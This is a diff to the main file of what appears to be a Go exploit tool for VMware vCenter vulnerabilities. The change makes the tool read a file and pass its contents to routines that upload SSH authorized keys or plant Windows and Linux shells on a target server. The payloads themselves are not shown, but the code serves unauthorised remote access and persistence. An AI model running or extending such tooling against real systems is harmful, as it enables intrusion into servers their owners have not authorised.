@@ -6,6 +6,7 @@ import (
 	"GO_VCENTER/src/c_22005"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"os"
 )
 
@@ -69,11 +70,14 @@ func main() {
 		}
 	case "21972":
 		{
+			t, err := ioutil.ReadFile(filename)
+			_ = err
+			fmt.Println(string(t))
 			if exp_type == "ssh" {
-				c_21972.Upload_ssh_authorized_keys(url, filename)
+				c_21972.Upload_ssh_authorized_keys(url, string(t))
 			} else {
-				c_21972.Upload_windows_shell(url, filename)
-				c_21972.Upload_linux_shell(url, filename)
+				c_21972.Upload_windows_shell(url, string(t))
+				c_21972.Upload_linux_shell(url, string(t))
 			}
 		}
 	}
